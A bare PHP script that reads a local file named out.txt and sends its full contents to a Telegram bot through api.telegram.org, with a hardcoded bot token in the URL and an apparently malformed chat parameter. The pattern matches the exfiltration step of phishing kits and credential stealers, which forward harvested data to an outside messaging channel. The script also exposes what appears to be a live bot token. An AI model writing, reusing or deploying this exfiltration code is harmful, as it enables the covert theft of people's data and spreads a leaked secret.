<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot6574775166:AAGpVH3jhxkv-SUV56FDFgZltTaZzcjXOyU/sendMessage?5910192660=CHATID&text=$msg");
?>